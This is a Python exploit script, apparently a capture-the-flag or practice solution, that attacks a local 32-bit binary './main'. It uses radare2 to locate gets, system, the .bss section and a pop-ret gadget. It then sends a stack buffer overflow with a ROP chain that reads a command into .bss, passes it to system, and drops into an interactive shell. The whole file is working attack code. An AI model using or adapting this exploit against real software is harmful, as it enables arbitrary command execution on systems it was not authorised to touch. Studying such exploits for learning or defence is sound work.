import r2pipe
import json
from pwn import *

GETS_PLT = 0x08048350
SYSTEM_PLT = 0x08048370

BSS = 0x0804a028

POP_RET = 0x080485cb

APP = "./main"

# Load file
r2 = r2pipe.open(APP)
r2.cmd('aaaa')  # Analysis

symbols = json.loads(r2.cmd('isj'))
for i in symbols:
    if i['type'] == 'FUNC' and i['name'] == 'imp.system':
        SYSTEM_PLT = i['vaddr']
        print("{} find on {}".format(i['name'], hex(SYSTEM_PLT)))
    elif i['type'] == 'FUNC' and i['name'] == 'imp.gets':
        GETS_PLT = i['vaddr']
        print("{} find on {}".format(i['name'], hex(GETS_PLT)))
    elif i['type'] == 'SECT' and i['name'] == '.bss':
        BSS = i['vaddr']
        print("{} find on {}".format(i['name'], hex(BSS)))

POP_RET = None
rops = json.loads(r2.cmd('/Rj'))
for r in rops:
    if (
            not POP_RET and
            len(r['opcodes']) > 2 and
            r['opcodes'][-1]['opcode'] == 'ret' and
            r['opcodes'][-2]['opcode'].startswith('pop')
    ):
        POP_RET = r['opcodes'][-2]['offset']
        print("Rop find on {}".format(hex(POP_RET)))
        break

s = process(APP)

# Uncomment for debugging
#gdb.attach(s, '''
#	b*0x080484e5
#	''')

payload = 'A'*128
payload += 'BBBB' # EBP

# ROP
# First call
payload += p32(GETS_PLT) # GETS
payload += p32(POP_RET) # RET ADDRESS GETS (GADGET)
payload += p32(BSS) # 1 PARAM FOR GETS

# Second call
payload += p32(SYSTEM_PLT) # SYSTEM
payload += 'AAAA' # RET ADDRESS SYSTEM
payload += p32(BSS) # 1 PARAM FOR SYSTEM


payload += '\n'
s.send(payload)
print(s.recv())
s.interactive()
s.close()